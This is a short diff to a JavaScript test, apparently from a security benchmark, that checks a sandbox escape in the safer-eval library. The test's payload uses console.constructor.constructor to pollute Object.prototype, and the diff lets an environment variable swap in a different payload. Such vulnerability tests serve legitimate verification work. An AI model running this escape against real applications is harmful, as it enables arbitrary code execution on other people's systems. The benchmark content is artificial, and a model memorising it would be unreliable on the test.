@@ -4,7 +4,7 @@ test("Arbitrary code execution in safer-eval", () => {
   expect({}.polluted).toBe(undefined);
   try {
     saferEval(
-      "console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env"
+      process.env.SECBENCH_PAYLOAD || ("console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env")
     );
   } catch (error) {}
   expect({}.polluted).toBe("yes");
